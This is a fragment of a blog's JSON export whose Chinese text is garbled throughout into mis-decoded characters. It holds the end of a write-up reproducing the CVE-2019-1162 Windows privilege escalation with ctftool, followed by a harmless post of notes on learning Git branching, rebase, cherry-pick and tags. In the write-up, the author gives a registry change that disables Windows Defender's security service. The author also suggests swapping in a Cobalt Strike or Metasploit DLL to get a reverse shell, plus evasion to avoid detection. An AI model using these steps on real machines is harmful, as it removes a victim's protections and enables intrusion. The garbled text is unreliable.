æ–‡ä»¶åˆ°è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œè¢«Defenderæ‹¦æˆªäº† ç”±äºåªæ˜¯å¤ç°ä¸€ä¸‹ï¼Œå°±ç›´æ¥å…³äº†å°±è¡Œ.. HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService åœ¨å³ä¾§æ‰¾åˆ°DWORDï¼ˆ32ä½ï¼‰å€¼ï¼Œå‘½åä¸ºStartã€‚ ä¿®æ”¹æ•°å€¼æ•°æ®ä¸º4 åŒæ ·å¯ä»¥ç›´æ¥ä¿®æ”¹dllä¸ºcobalt Stikeæˆ–è€…msfç”Ÿæˆçš„dllå°±å¯ä»¥å›å¼¹äº†ï¼Œç®€å•æ–¹ä¾¿ï½é—®é¢˜ï¼š æµ‹è¯•win7å’Œwin10 1903éƒ½å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯æœ‰äº›ç¯å¢ƒæç¤ºç¼ºå°‘MSVCPxx.dllï¼Œéœ€è¦ä¾èµ–ã€‚ éœ€è¦å¤šæ¬¡äº¤äº’ï¼Œå»ºè®®æ”¹æºç æˆ–è€…å†™ä¸€é”®è„šæœ¬ ç‰¹å¾å¤ªæ˜æ˜¾ï¼Œéœ€è¦å…æ€ 0x03 è§†é¢‘https://www.bilibili.com/video/av64061036/ 0x04 é“¾æ¥https://github.com/taviso/ctftoolhttps://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhchttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"Windowsææƒ","slug":"Windowsææƒ","permalink":"http://patrilic.top/tags/Windowsææƒ/"}]},{"title":"ä»Learn Git Branchingå­¦ä¹ Git","slug":"ä»Learn Git Branchingå­¦ä¹ Git","date":"2019-08-15T01:14:11.000Z","updated":"2019-08-20T15:30:47.442Z","comments":true,"path":"2019/08/15/ä»Learn Git Branchingå­¦ä¹ Git/","link":"","permalink":"http://patrilic.top/2019/08/15/ä»Learn Git Branchingå­¦ä¹ Git/","excerpt":"","text":"@Author: Patrilic@Time: 2019-08-15 09:14:11 0x00 å‰è¨€å­¦å­¦å­¦ï½ï¼Œçªç„¶å‘ç°GitçœŸçš„æ˜¯ç¥å™¨ã€‚ã€‚å¯æƒœæˆ‘ä»¥å‰åªä¼šgit cloneå’Œgit pullä¹‹ç±»çš„.. ç„¶åè¿™æ¬¡æ‰“ç®—åˆ©ç”¨Learn Git Branchingè¿™ä¸ªç½‘ç«™å¿«é€Ÿå…¥é—¨Gitï¼Œåšä¸ªè®°å½• 0x01 åŸºç¡€ç¯‡Git CommitGit ä»“åº“ä¸­çš„æäº¤è®°å½•ä¿å­˜çš„æ˜¯ä½ çš„ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å¿«ç…§ï¼Œå°±åƒæ˜¯æŠŠæ•´ä¸ªç›®å½•å¤åˆ¶ï¼Œç„¶åå†ç²˜è´´ä¸€æ ·ï¼Œä½†æ¯”å¤åˆ¶ç²˜è´´ä¼˜é›…è®¸å¤šï¼ Git å¸Œæœ›æäº¤è®°å½•å°½å¯èƒ½åœ°è½»é‡ï¼Œå› æ­¤åœ¨ä½ æ¯æ¬¡è¿›è¡Œæäº¤æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›²ç›®åœ°å¤åˆ¶æ•´ä¸ªç›®å½•ã€‚æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ï¼Œå®ƒä¼šå°†å½“å‰ç‰ˆæœ¬ä¸ä»“åº“ä¸­çš„ä¸Šä¸€ä¸ªç‰ˆæœ¬è¿›è¡Œå¯¹æ¯”ï¼Œå¹¶æŠŠæ‰€æœ‰çš„å·®å¼‚æ‰“åŒ…åˆ°ä¸€èµ·ä½œä¸ºä¸€ä¸ªæäº¤è®°å½•ã€‚ Git è¿˜ä¿å­˜äº†æäº¤çš„å†å²è®°å½•ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¤§å¤šæ•°æäº¤è®°å½•çš„ä¸Šé¢éƒ½æœ‰çˆ¶èŠ‚ç‚¹çš„åŸå›  â€”â€” æˆ‘ä»¬ä¼šåœ¨å›¾ç¤ºä¸­ç”¨ç®­å¤´æ¥è¡¨ç¤ºè¿™ç§å…³ç³»ã€‚å¯¹äºé¡¹ç›®ç»„çš„æˆå‘˜æ¥è¯´ï¼Œç»´æŠ¤æäº¤å†å²å¯¹å¤§å®¶éƒ½æœ‰å¥½å¤„ ä½¿ç”¨Git commitä¼šå°†å½“å‰èŠ‚ç‚¹å˜æˆçˆ¶èŠ‚ç‚¹ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šç”Ÿæˆå­èŠ‚ç‚¹ Git branchGit çš„åˆ†æ”¯ä¹Ÿéå¸¸è½»é‡ã€‚å®ƒä»¬åªæ˜¯ç®€å•åœ°æŒ‡å‘æŸä¸ªæäº¤çºªå½• â€”â€” ä»…æ­¤è€Œå·²ã€‚æ‰€ä»¥è®¸å¤š Git çˆ±å¥½è€…ä¼ é¢‚ï¼š æ—©å»ºåˆ†æ”¯ï¼å¤šç”¨åˆ†æ”¯ï¼ è¿™æ˜¯å› ä¸ºå³ä½¿åˆ›å»ºå†å¤šåˆ†çš„æ”¯ä¹Ÿä¸ä¼šé€ æˆå‚¨å­˜æˆ–å†…å­˜ä¸Šçš„å¼€é”€ï¼Œå¹¶ä¸”æŒ‰é€»è¾‘åˆ†è§£å·¥ä½œåˆ°ä¸åŒçš„åˆ†æ”¯è¦æ¯”ç»´æŠ¤é‚£äº›ç‰¹åˆ«è‡ƒè‚¿çš„åˆ†æ”¯ç®€å•å¤šäº†ã€‚ åœ¨å°†åˆ†æ”¯å’Œæäº¤è®°å½•ç»“åˆèµ·æ¥åï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸¤è€…å¦‚ä½•åä½œã€‚ç°åœ¨åªè¦è®°ä½ä½¿ç”¨åˆ†æ”¯å…¶å®å°±ç›¸å½“äºåœ¨è¯´ï¼šâ€œæˆ‘æƒ³åŸºäºè¿™ä¸ªæäº¤ä»¥åŠå®ƒæ‰€æœ‰çš„çˆ¶æäº¤è¿›è¡Œæ–°çš„å·¥ä½œã€‚â€ ä½¿ç”¨git checkout &lt;name&gt;æ¥åˆ‡æ¢åˆ†æ”¯ å¦‚æœä½ æƒ³åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯åŒæ—¶åˆ‡æ¢åˆ°æ–°åˆ›å»ºçš„åˆ†æ”¯çš„è¯ï¼Œå¯ä»¥é€šè¿‡ git checkout -b &lt;your-branch-name&gt;æ¥å®ç°ã€‚ git mergeåœ¨ Git ä¸­åˆå¹¶ä¸¤ä¸ªåˆ†æ”¯æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªç‰¹æ®Šçš„æäº¤è®°å½•ï¼Œå®ƒæœ‰ä¸¤ä¸ªçˆ¶èŠ‚ç‚¹ã€‚ç¿»è¯‘æˆè‡ªç„¶è¯­è¨€ç›¸å½“äºï¼šâ€œæˆ‘è¦æŠŠè¿™ä¸¤ä¸ªçˆ¶èŠ‚ç‚¹æœ¬èº«åŠå®ƒä»¬æ‰€æœ‰çš„ç¥–å…ˆéƒ½åŒ…å«è¿›æ¥ã€‚â€ Git RebaseRebase å®é™…ä¸Šå°±æ˜¯å–å‡ºä¸€ç³»åˆ—çš„æäº¤è®°å½•ï¼Œâ€œå¤åˆ¶â€å®ƒä»¬ï¼Œç„¶ååœ¨å¦å¤–ä¸€ä¸ªåœ°æ–¹é€ä¸ªçš„æ”¾ä¸‹å»ã€‚ Rebase çš„ä¼˜åŠ¿å°±æ˜¯å¯ä»¥åˆ›é€ æ›´çº¿æ€§çš„æäº¤å†å²ï¼Œè¿™å¬ä¸Šå»æœ‰äº›éš¾ä»¥ç†è§£ã€‚å¦‚æœåªå…è®¸ä½¿ç”¨ Rebase çš„è¯ï¼Œä»£ç åº“çš„æäº¤å†å²å°†ä¼šå˜å¾—å¼‚å¸¸æ¸…æ™°ã€‚ 0x02 é«˜çº§ç¯‡åˆ†ç¦»HEADæˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹ â€œHEADâ€ã€‚ HEAD æ˜¯ä¸€ä¸ªå¯¹å½“å‰æ£€å‡ºè®°å½•çš„ç¬¦å·å¼•ç”¨ â€”â€” ä¹Ÿå°±æ˜¯æŒ‡å‘ä½ æ­£åœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œå·¥ä½œçš„æäº¤è®°å½•ã€‚ HEAD æ€»æ˜¯æŒ‡å‘å½“å‰åˆ†æ”¯ä¸Šæœ€è¿‘ä¸€æ¬¡æäº¤è®°å½•ã€‚å¤§å¤šæ•°ä¿®æ”¹æäº¤æ ‘çš„ Git å‘½ä»¤éƒ½æ˜¯ä»æ”¹å˜ HEAD çš„æŒ‡å‘å¼€å§‹çš„ã€‚ HEAD é€šå¸¸æƒ…å†µä¸‹æ˜¯æŒ‡å‘åˆ†æ”¯åçš„ï¼ˆå¦‚ bugFixï¼‰ã€‚åœ¨ä½ æäº¤æ—¶ï¼Œæ”¹å˜äº† bugFix çš„çŠ¶æ€ï¼Œè¿™ä¸€å˜åŒ–é€šè¿‡ HEAD å˜å¾—å¯è§ã€‚ ç›¸å¯¹å¼•ç”¨é€šè¿‡æŒ‡å®šæäº¤è®°å½•å“ˆå¸Œå€¼çš„æ–¹å¼åœ¨ Git ä¸­ç§»åŠ¨ä¸å¤ªæ–¹ä¾¿ã€‚åœ¨å®é™…åº”ç”¨æ—¶ï¼Œå¹¶æ²¡æœ‰åƒæœ¬ç¨‹åºä¸­è¿™ä¹ˆæ¼‚äº®çš„å¯è§†åŒ–æäº¤æ ‘ä¾›ä½ å‚è€ƒï¼Œæ‰€ä»¥ä½ å°±ä¸å¾—ä¸ç”¨ git log æ¥æŸ¥æŸ¥çœ‹æäº¤è®°å½•çš„å“ˆå¸Œå€¼ã€‚ å¹¶ä¸”å“ˆå¸Œå€¼åœ¨çœŸå®çš„ Git ä¸–ç•Œä¸­ä¹Ÿä¼šæ›´é•¿ï¼ˆè¯‘è€…æ³¨ï¼šåŸºäº SHA-1ï¼Œå…± 40 ä½ï¼‰ã€‚ä¾‹å¦‚å‰ä¸€å…³çš„ä»‹ç»ä¸­çš„æäº¤è®°å½•çš„å“ˆå¸Œå€¼å¯èƒ½æ˜¯ fed2da64c0efc5293610bdd892f82a58e8cbc5d8ã€‚èˆŒå¤´éƒ½å¿«æ‰“ç»“äº†å§â€¦ æ¯”è¾ƒä»¤äººæ¬£æ…°çš„æ˜¯ï¼ŒGit å¯¹å“ˆå¸Œçš„å¤„ç†å¾ˆæ™ºèƒ½ã€‚ä½ åªéœ€è¦æä¾›èƒ½å¤Ÿå”¯ä¸€æ ‡è¯†æäº¤è®°å½•çš„å‰å‡ ä¸ªå­—ç¬¦å³å¯ã€‚å› æ­¤æˆ‘å¯ä»¥ä»…è¾“å…¥fed2 è€Œä¸æ˜¯ä¸Šé¢çš„ä¸€é•¿ä¸²å­—ç¬¦ã€‚ â€œ~â€æ“ä½œç¬¦å¦‚æœä½ æƒ³åœ¨æäº¤æ ‘ä¸­å‘ä¸Šç§»åŠ¨å¾ˆå¤šæ­¥çš„è¯ï¼Œæ•²é‚£ä¹ˆå¤š ^ è²Œä¼¼ä¹ŸæŒºçƒ¦äººçš„ï¼ŒGit å½“ç„¶ä¹Ÿè€ƒè™‘åˆ°äº†è¿™ä¸€ç‚¹ï¼Œäºæ˜¯åˆå¼•å…¥äº†æ“ä½œç¬¦ ~ã€‚ è¯¥æ“ä½œç¬¦åé¢å¯ä»¥è·Ÿä¸€ä¸ªæ•°å­—ï¼ˆå¯é€‰ï¼Œä¸è·Ÿæ•°å­—æ—¶ä¸ ^ ç›¸åŒï¼Œå‘ä¸Šç§»åŠ¨ä¸€æ¬¡ï¼‰ï¼ŒæŒ‡å®šå‘ä¸Šç§»åŠ¨å¤šå°‘æ¬¡ã€‚å’±ä»¬è¿˜æ˜¯é€šè¿‡å®é™…æ“ä½œçœ‹ä¸€ä¸‹å§ å¼ºåˆ¶ä¿®æ”¹åˆ†æ”¯ä½ç½®ä½ ç°åœ¨æ˜¯ç›¸å¯¹å¼•ç”¨çš„ä¸“å®¶äº†ï¼Œç°åœ¨ç”¨å®ƒæ¥åšç‚¹å®é™…äº‹æƒ…ã€‚ æˆ‘ä½¿ç”¨ç›¸å¯¹å¼•ç”¨æœ€å¤šçš„å°±æ˜¯ç§»åŠ¨åˆ†æ”¯ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨ -f é€‰é¡¹è®©åˆ†æ”¯æŒ‡å‘å¦ä¸€ä¸ªæäº¤ã€‚ä¾‹å¦‚: git branch -f master HEAD~3 ä¸Šé¢çš„å‘½ä»¤ä¼šå°† master åˆ†æ”¯å¼ºåˆ¶æŒ‡å‘ HEAD çš„ç¬¬ 3 çº§çˆ¶æäº¤ã€‚ è¿™å…³çš„ç»ƒä¹ æŒºæœ‰æ„æ€çš„ahhh æ’¤é”€å˜æ›´åœ¨ Git é‡Œæ’¤é”€å˜æ›´çš„æ–¹æ³•å¾ˆå¤šã€‚å’Œæäº¤ä¸€æ ·ï¼Œæ’¤é”€å˜æ›´ç”±åº•å±‚éƒ¨åˆ†ï¼ˆæš‚å­˜åŒºçš„ç‹¬ç«‹æ–‡ä»¶æˆ–è€…ç‰‡æ®µï¼‰å’Œä¸Šå±‚éƒ¨åˆ†ï¼ˆå˜æ›´åˆ°åº•æ˜¯é€šè¿‡å“ªç§æ–¹å¼è¢«æ’¤é”€çš„ï¼‰ç»„æˆã€‚æˆ‘ä»¬è¿™ä¸ªåº”ç”¨ä¸»è¦å…³æ³¨çš„æ˜¯åè€…ã€‚ ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ç”¨æ¥æ’¤é”€å˜æ›´ â€”â€” ä¸€æ˜¯ git resetï¼Œè¿˜æœ‰å°±æ˜¯ git revertã€‚æ¥ä¸‹æ¥å’±ä»¬é€ä¸ªè¿›è¡Œè®²è§£ã€‚ 0x03 ç§»åŠ¨æäº¤è®°å½•Git Cherry-pickæœ¬ç³»åˆ—çš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ git cherry-pick, å‘½ä»¤å½¢å¼ä¸º: git cherry-pick &lt;æäº¤å·&gt;â€¦å¦‚æœä½ æƒ³å°†ä¸€äº›æäº¤å¤åˆ¶åˆ°å½“å‰æ‰€åœ¨çš„ä½ç½®ï¼ˆHEADï¼‰ä¸‹é¢çš„è¯ï¼Œ Cherry-pick æ˜¯æœ€ç›´æ¥çš„æ–¹å¼äº†ã€‚æˆ‘ä¸ªäººéå¸¸å–œæ¬¢ cherry-pickï¼Œå› ä¸ºå®ƒç‰¹åˆ«ç®€å•ã€‚ äº¤äº’å¼çš„ rebaseå½“ä½ çŸ¥é“ä½ æ‰€éœ€è¦çš„æäº¤è®°å½•ï¼ˆå¹¶ä¸”è¿˜çŸ¥é“è¿™äº›æäº¤è®°å½•çš„å“ˆå¸Œå€¼ï¼‰æ—¶, ç”¨ cherry-pick å†å¥½ä¸è¿‡äº† â€”â€” æ²¡æœ‰æ¯”è¿™æ›´ç®€å•çš„æ–¹å¼äº†ã€‚ ä½†æ˜¯å¦‚æœä½ ä¸æ¸…æ¥šä½ æƒ³è¦çš„æäº¤è®°å½•çš„å“ˆå¸Œå€¼å‘¢? å¹¸å¥½ Git å¸®ä½ æƒ³åˆ°äº†è¿™ä¸€ç‚¹, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨äº¤äº’å¼çš„ rebase â€”â€” å¦‚æœä½ æƒ³ä»ä¸€ç³»åˆ—çš„æäº¤è®°å½•ä¸­æ‰¾åˆ°æƒ³è¦çš„è®°å½•, è¿™å°±æ˜¯æœ€å¥½çš„æ–¹æ³•äº† äº¤äº’å¼ rebase æŒ‡çš„æ˜¯ä½¿ç”¨å¸¦å‚æ•° â€“interactive çš„ rebase å‘½ä»¤, ç®€å†™ä¸º -i å¦‚æœä½ åœ¨å‘½ä»¤åå¢åŠ äº†è¿™ä¸ªé€‰é¡¹, Git ä¼šæ‰“å¼€ä¸€ä¸ª UI ç•Œé¢å¹¶åˆ—å‡ºå°†è¦è¢«å¤åˆ¶åˆ°ç›®æ ‡åˆ†æ”¯çš„å¤‡é€‰æäº¤è®°å½•ï¼Œå®ƒè¿˜ä¼šæ˜¾ç¤ºæ¯ä¸ªæäº¤è®°å½•çš„å“ˆå¸Œå€¼å’Œæäº¤è¯´æ˜ï¼Œæäº¤è¯´æ˜æœ‰åŠ©äºä½ ç†è§£è¿™ä¸ªæäº¤è¿›è¡Œäº†å“ªäº›æ›´æ”¹ã€‚ åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œæ‰€è°“çš„ UI çª—å£ä¸€èˆ¬ä¼šåœ¨æ–‡æœ¬ç¼–è¾‘å™¨ â€”â€” å¦‚ Vim â€”â€” ä¸­æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ã€‚ è€ƒè™‘åˆ°è¯¾ç¨‹çš„åˆè¡·ï¼Œæˆ‘å¼„äº†ä¸€ä¸ªå¯¹è¯æ¡†æ¥æ¨¡æ‹Ÿè¿™äº›æ“ä½œã€‚ å½“ rebase UIç•Œé¢æ‰“å¼€æ—¶, ä½ èƒ½åš3ä»¶äº‹: è°ƒæ•´æäº¤è®°å½•çš„é¡ºåºï¼ˆé€šè¿‡é¼ æ ‡æ‹–æ”¾æ¥å®Œæˆï¼‰åˆ é™¤ä½ ä¸æƒ³è¦çš„æäº¤ï¼ˆé€šè¿‡åˆ‡æ¢ pick çš„çŠ¶æ€æ¥å®Œæˆï¼Œå…³é—­å°±æ„å‘³ç€ä½ ä¸æƒ³è¦è¿™ä¸ªæäº¤è®°å½•ï¼‰åˆå¹¶æäº¤ã€‚ é—æ†¾çš„æ˜¯ç”±äºæŸç§é€»è¾‘çš„åŸå› ï¼Œæˆ‘ä»¬çš„è¯¾ç¨‹ä¸æ”¯æŒæ­¤åŠŸèƒ½ï¼Œå› æ­¤æˆ‘ä¸ä¼šè¯¦ç»†ä»‹ç»è¿™ä¸ªæ“ä½œã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå…è®¸ä½ æŠŠå¤šä¸ªæäº¤è®°å½•åˆå¹¶æˆä¸€ä¸ªã€‚ 0x04 æ‚é¡¹æœ¬åœ°æ ˆå¼æäº¤çœ‹ä¸€ä¸ªåœ¨å¼€å‘ä¸­ç»å¸¸ä¼šé‡åˆ°çš„æƒ…å†µï¼šæˆ‘æ­£åœ¨è§£å†³æŸä¸ªç‰¹åˆ«æ£˜æ‰‹çš„ Bugï¼Œä¸ºäº†ä¾¿äºè°ƒè¯•è€Œåœ¨ä»£ç ä¸­æ·»åŠ äº†ä¸€äº›è°ƒè¯•å‘½ä»¤å¹¶å‘æ§åˆ¶å°æ‰“å°äº†ä¸€äº›ä¿¡æ¯ã€‚ è¿™äº›è°ƒè¯•å’Œæ‰“å°è¯­å¥éƒ½åœ¨å®ƒä»¬å„è‡ªçš„æäº¤è®°å½•é‡Œã€‚æœ€åæˆ‘ç»ˆäºæ‰¾åˆ°äº†é€ æˆè¿™ä¸ª Bug çš„æ ¹æœ¬åŸå› ï¼Œè§£å†³æ‰ä»¥åè§‰å¾—æ²¾æ²¾è‡ªå–œï¼ æœ€åå°±å·®æŠŠ bugFix åˆ†æ”¯é‡Œçš„å·¥ä½œåˆå¹¶å› master åˆ†æ”¯äº†ã€‚ä½ å¯ä»¥é€‰æ‹©é€šè¿‡ fast-forward å¿«é€Ÿåˆå¹¶åˆ° master åˆ†æ”¯ä¸Šï¼Œä½†è¿™æ ·çš„è¯ master åˆ†æ”¯å°±ä¼šåŒ…å«æˆ‘è¿™äº›è°ƒè¯•è¯­å¥äº†ã€‚ä½ è‚¯å®šä¸æƒ³è¿™æ ·ï¼Œåº”è¯¥è¿˜æœ‰æ›´å¥½çš„æ–¹å¼â€¦â€¦ å®é™…æˆ‘ä»¬åªè¦è®© Git å¤åˆ¶è§£å†³é—®é¢˜çš„é‚£ä¸€ä¸ªæäº¤è®°å½•å°±å¯ä»¥äº†ã€‚è·Ÿä¹‹å‰æˆ‘ä»¬åœ¨â€œæ•´ç†æäº¤è®°å½•â€ä¸­å­¦åˆ°çš„ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ 12git rebase -igit cherry-pick æ¥è¾¾åˆ°ç›®çš„ã€‚ æäº¤çš„æŠ€å·§ #1æ¥ä¸‹æ¥è¿™ç§æƒ…å†µä¹Ÿæ˜¯å¾ˆå¸¸è§çš„ï¼šä½ ä¹‹å‰åœ¨ newImage åˆ†æ”¯ä¸Šè¿›è¡Œäº†ä¸€æ¬¡æäº¤ï¼Œç„¶ååˆåŸºäºå®ƒåˆ›å»ºäº† caption åˆ†æ”¯ï¼Œç„¶ååˆæäº¤äº†ä¸€æ¬¡ã€‚ æ­¤æ—¶ä½ æƒ³å¯¹çš„æŸä¸ªä»¥å‰çš„æäº¤è®°å½•è¿›è¡Œä¸€äº›å°å°çš„è°ƒæ•´ã€‚æ¯”å¦‚è®¾è®¡å¸ˆæƒ³ä¿®æ”¹ä¸€ä¸‹ newImage ä¸­å›¾ç‰‡çš„åˆ†è¾¨ç‡ï¼Œå°½ç®¡é‚£ä¸ªæäº¤è®°å½•å¹¶ä¸æ˜¯æœ€æ–°çš„äº†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•æ¥å…‹æœå›°éš¾ï¼š å…ˆç”¨ git rebase -i å°†æäº¤é‡æ–°æ’åºï¼Œç„¶åæŠŠæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„æäº¤è®°å½•æŒªåˆ°æœ€å‰ ç„¶åç”¨ commit â€“amend æ¥è¿›è¡Œä¸€äº›å°ä¿®æ”¹ æ¥ç€å†ç”¨ git rebase -i æ¥å°†ä»–ä»¬è°ƒå›åŸæ¥çš„é¡ºåº æœ€åæˆ‘ä»¬æŠŠ master ç§»åˆ°ä¿®æ”¹çš„æœ€å‰ç«¯ï¼ˆç”¨ä½ è‡ªå·±å–œæ¬¢çš„æ–¹æ³•ï¼‰ï¼Œå°±å¤§åŠŸå‘Šæˆå•¦ï¼ å½“ç„¶å®Œæˆè¿™ä¸ªä»»åŠ¡çš„æ–¹æ³•ä¸æ­¢ä¸Šé¢æåˆ°çš„ä¸€ç§ï¼ˆæˆ‘çŸ¥é“ä½ åœ¨çœ‹ cherry-pick å•¦ï¼‰ï¼Œä¹‹åæˆ‘ä»¬ä¼šå¤šç‚¹å…³æ³¨è¿™äº›æŠ€å·§å•¦ï¼Œä½†ç°åœ¨æš‚æ—¶åªä¸“æ³¨ä¸Šé¢è¿™ç§æ–¹æ³•ã€‚ æœ€åæœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹ç›®æ ‡çŠ¶æ€ä¸­çš„é‚£å‡ ä¸ª&#39; â€”â€” æˆ‘ä»¬æŠŠè¿™ä¸ªæäº¤ç§»åŠ¨äº†ä¸¤æ¬¡ï¼Œæ¯ç§»åŠ¨ä¸€æ¬¡ä¼šäº§ç”Ÿä¸€ä¸ª &#39;ï¼›è€Œ C2 ä¸Šå¤šå‡ºæ¥çš„é‚£ä¸ªæ˜¯æˆ‘ä»¬åœ¨ä½¿ç”¨äº† amend å‚æ•°æäº¤æ—¶äº§ç”Ÿçš„ï¼Œæ‰€ä»¥æœ€ç»ˆç»“æœå°±æ˜¯è¿™æ ·äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘åœ¨å¯¹æ¯”ç»“æœçš„æ—¶å€™åªä¼šå¯¹æ¯”æäº¤æ ‘çš„ç»“æ„ï¼Œå¯¹äº &#39; çš„æ•°é‡ä¸Šçš„ä¸åŒï¼Œå¹¶ä¸çº³å…¥å¯¹æ¯”èŒƒå›´å†…ã€‚åªè¦ä½ çš„ master åˆ†æ”¯ç»“æ„ä¸ç›®æ ‡ç»“æ„ç›¸åŒï¼Œæˆ‘å°±ç®—ä½ é€šè¿‡ã€‚ æäº¤çš„æŠ€å·§ #2 ä½¿ç”¨cherry-pickè€Œä¸æ˜¯rebase Git Tagsç›¸ä¿¡é€šè¿‡å‰é¢è¯¾ç¨‹çš„å­¦ä¹ ä½ å·²ç»å‘ç°äº†ï¼šåˆ†æ”¯å¾ˆå®¹æ˜“è¢«äººä¸ºç§»åŠ¨ï¼Œå¹¶ä¸”å½“æœ‰æ–°çš„æäº¤æ—¶ï¼Œå®ƒä¹Ÿä¼šç§»åŠ¨ã€‚åˆ†æ”¯å¾ˆå®¹æ˜“è¢«æ”¹å˜ï¼Œå¤§éƒ¨åˆ†åˆ†æ”¯è¿˜åªæ˜¯ä¸´æ—¶çš„ï¼Œå¹¶ä¸”è¿˜ä¸€ç›´åœ¨å˜ã€‚ ä½ å¯èƒ½ä¼šé—®äº†ï¼šæœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ°¸è¿œæŒ‡å‘æŸä¸ªæäº¤è®°å½•çš„æ ‡è¯†å‘¢ï¼Œæ¯”å¦‚è½¯ä»¶å‘å¸ƒæ–°çš„å¤§ç‰ˆæœ¬ï¼Œæˆ–è€…æ˜¯ä¿®æ­£ä¸€äº›é‡è¦çš„ Bug æˆ–æ˜¯å¢åŠ äº†æŸäº›æ–°ç‰¹æ€§ï¼Œæœ‰æ²¡æœ‰æ¯”åˆ†æ”¯æ›´å¥½çš„å¯ä»¥æ°¸è¿œæŒ‡å‘è¿™äº›æäº¤çš„æ–¹æ³•å‘¢ï¼Ÿ å½“ç„¶æœ‰äº†ï¼Git çš„ tag å°±æ˜¯å¹²è¿™ä¸ªç”¨çš„å•Šï¼Œå®ƒä»¬å¯ä»¥ï¼ˆåœ¨æŸç§ç¨‹åº¦ä¸Š â€”â€” å› ä¸ºæ ‡ç­¾å¯ä»¥è¢«åˆ é™¤åé‡æ–°åœ¨å¦å¤–ä¸€ä¸ªä½ç½®åˆ›å»ºåŒåçš„æ ‡ç­¾ï¼‰æ°¸ä¹…åœ°å°†æŸä¸ªç‰¹å®šçš„æäº¤å‘½åä¸ºé‡Œç¨‹ç¢‘ï¼Œç„¶åå°±å¯ä»¥åƒåˆ†æ”¯ä¸€æ ·å¼•ç”¨äº†ã€‚ æ›´éš¾å¾—çš„æ˜¯ï¼Œå®ƒä»¬å¹¶ä¸ä¼šéšç€æ–°çš„æäº¤è€Œç§»åŠ¨ã€‚ä½ ä¹Ÿä¸èƒ½æ£€å‡ºåˆ°æŸä¸ªæ ‡ç­¾ä¸Šé¢è¿›è¡Œä¿®æ”¹æäº¤ï¼Œå®ƒå°±åƒæ˜¯æäº¤æ ‘ä¸Šçš„ä¸€ä¸ªé”šç‚¹ï¼Œæ ‡è¯†äº†æŸä¸ªç‰¹å®šçš„ä½ç½®ã€‚ å’±ä»¬æ¥çœ‹çœ‹æ ‡ç­¾åˆ°åº•æ˜¯ä»€ä¹ˆæ ·ã€‚ Git Describeç”±äºæ ‡ç­¾åœ¨ä»£ç åº“ä¸­èµ·ç€â€œé”šç‚¹â€çš„ä½œç”¨ï¼ŒGit è¿˜ä¸ºæ­¤ä¸“é—¨è®¾è®¡äº†ä¸€ä¸ªå‘½ä»¤ç”¨æ¥æè¿°ç¦»ä½ æœ€è¿‘çš„é”šç‚¹ï¼ˆä¹Ÿå°±æ˜¯æ ‡ç­¾ï¼‰ï¼Œå®ƒå°±æ˜¯ git describeï¼ Git Describe èƒ½å¸®ä½ åœ¨æäº¤å†å²ä¸­ç§»åŠ¨äº†å¤šæ¬¡ä»¥åæ‰¾åˆ°æ–¹å‘ï¼›å½“ä½ ç”¨ git bisectï¼ˆä¸€ä¸ªæŸ¥æ‰¾äº§ç”Ÿ Bug çš„æäº¤è®°å½•çš„æŒ‡ä»¤ï¼‰æ‰¾åˆ°æŸä¸ªæäº¤è®°å½•æ—¶ï¼Œæˆ–è€…æ˜¯å½“ä½ ååœ¨ä½ é‚£åˆšåˆšåº¦å‡å›æ¥çš„åŒäº‹çš„ç”µè„‘å‰æ—¶ï¼Œ å¯èƒ½ä¼šç”¨åˆ°è¿™ä¸ªå‘½ä»¤ã€‚ 0x05 RemoteGit clone Git FetchGit è¿œç¨‹ä»“åº“ç›¸å½“çš„æ“ä½œå®é™…å¯ä»¥å½’çº³ä¸ºä¸¤ç‚¹ï¼šå‘è¿œç¨‹ä»“åº“ä¼ è¾“æ•°æ®ä»¥åŠä»è¿œç¨‹ä»“åº“è·å–æ•°æ®ã€‚æ—¢ç„¶æˆ‘ä»¬èƒ½ä¸è¿œç¨‹ä»“åº“åŒæ­¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ†äº«ä»»ä½•èƒ½è¢« Git ç®¡ç†çš„æ›´æ–°ï¼ˆå› æ­¤å¯ä»¥åˆ†äº«ä»£ç ã€æ–‡ä»¶ã€æƒ³æ³•ã€æƒ…ä¹¦ç­‰ç­‰ï¼‰ã€‚ æœ¬èŠ‚è¯¾æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•ä»è¿œç¨‹ä»“åº“è·å–æ•°æ® â€”â€” å‘½ä»¤å¦‚å…¶åï¼Œå®ƒå°±æ˜¯ git fetchã€‚ Git Pull Git fakeTeamwork master Git Push å†å²åˆ†æ”¯ï¼ˆå®ç”¨ï¼‰ 0x06 